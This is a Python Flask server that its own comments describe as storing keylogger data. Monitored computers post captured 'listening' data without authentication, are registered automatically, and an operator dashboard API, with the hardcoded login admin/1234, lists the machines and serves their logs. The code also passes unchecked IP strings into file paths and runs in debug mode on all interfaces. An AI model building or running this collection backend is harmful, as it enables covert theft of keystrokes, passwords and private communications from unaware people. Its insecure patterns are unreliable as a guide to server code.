from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import json
from datetime import datetime

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Demo user credentials
users = {"admin": "1234"}
computers = []

# Directory for storing keylogger data
LISTEN_DIR = "listening_files"

if not os.path.exists(LISTEN_DIR):
    os.makedirs(LISTEN_DIR)


@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if users.get(username) == password:
        return jsonify({"success": True, "username": username})
    return jsonify({"success": False, "message": "שם משתמש או סיסמה שגויים"}), 401


@app.route('/api/computers', methods=['GET'])
def get_computers():
    # Add data availability flag for each computer
    for computer in computers:
        file_path = os.path.join(LISTEN_DIR, f"{computer['ip']}.log")
        computer['data'] = os.path.exists(file_path)
        if computer['data'] and 'last_modified' not in computer:
            computer['last_modified'] = datetime.fromtimestamp(
                os.path.getmtime(file_path)
            ).strftime("%Y-%m-%d %H:%M:%S")

    return jsonify(computers)


@app.route('/api/computers', methods=['POST'])
def add_computer():
    data = request.json
    name = data.get('name')
    ip = data.get("ip")

    if not name or not ip:
        return jsonify({"success": False, "message": "נא למלא את כל השדות"}), 400

    # Check if computer already exists
    for computer in computers:
        if computer['ip'] == ip:
            return jsonify({"success": False, "message": "מחשב עם IP זה כבר קיים במערכת"}), 400

    new_computer = {
        "name": name,
        "ip": ip,
        "status": "offline",
        "lastActivity": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "data": False,
        "last_modified": ""
    }

    computers.append(new_computer)
    return jsonify(new_computer)


@app.route('/api/computers/<string:computer_ip>', methods=['DELETE'])
def remove_computer(computer_ip):
    global computers
    computers = [computer for computer in computers if computer['ip'] != computer_ip]

    # Also remove any keylogger data file
    file_path = os.path.join(LISTEN_DIR, f"{computer_ip}.log")
    if os.path.exists(file_path):
        os.remove(file_path)

    return jsonify({"success": True})


@app.route('/api/computers/<string:computer_ip>', methods=['GET'])
def get_computer(computer_ip):
    computer = next((computer for computer in computers if computer['ip'] == computer_ip), None)
    if computer:
        file_path = os.path.join(LISTEN_DIR, f"{computer_ip}.log")
        computer['data'] = os.path.exists(file_path)
        if computer['data']:
            computer["last_modified"] = datetime.fromtimestamp(
                os.path.getmtime(file_path)
            ).strftime("%Y-%m-%d %H:%M:%S")
        return jsonify(computer)
    return jsonify({"error": "מחשב לא נמצא"}), 404


@app.route('/api/listening/<string:computer_ip>', methods=['GET'])
def get_listening_data(computer_ip):
    file_path = os.path.join(LISTEN_DIR, f"{computer_ip}.log")

    if not os.path.exists(file_path):
        return jsonify({"error": "אין נתוני האזנה זמינים"}), 404

    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        return jsonify(data)
    except json.JSONDecodeError:
        return jsonify({"error": "קובץ נתונים פגום"}), 500
    except Exception as e:
        return jsonify({"error": f"שגיאה בקריאת נתוני האזנה: {str(e)}"}), 500


@app.route('/api/listening/<string:computer_ip>', methods=['POST'])
def add_listening_data(computer_ip):
    data = request.json

    # Update computer status if it exists
    computer = next((computer for computer in computers if computer['ip'] == computer_ip), None)
    if computer:
        computer['status'] = 'online'
        computer['lastActivity'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    else:
        # Auto-register new computer if it doesn't exist
        new_computer = {
            "name": f"Computer-{computer_ip}",
            "ip": computer_ip,
            "status": "online",
            "lastActivity": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "data": True
        }
        computers.append(new_computer)

    # Save listening data
    file_path = os.path.join(LISTEN_DIR, f"{computer_ip}.log")

    try:
        if os.path.exists(file_path):
            with open(file_path, 'r') as file:
                try:
                    existing_data = json.load(file)
                except json.JSONDecodeError:
                    existing_data = {}

            # Check if data is a dict or a list
            if isinstance(existing_data, dict):
                existing_data.update(data)
            else:
                # If existing_data is a list, we can't update it directly
                # Convert both to lists and concat them
                if isinstance(data, list):
                    existing_data.extend(data)
                else:
                    existing_data.append(data)

            with open(file_path, 'w') as file:
                json.dump(existing_data, file)
        else:
            with open(file_path, 'w') as file:
                json.dump(data, file)

        # Update last_modified if the computer exists
        if computer:
            computer['last_modified'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            computer['data'] = True

        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": f"שגיאה בשמירת נתוני האזנה: {str(e)}"}), 500


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')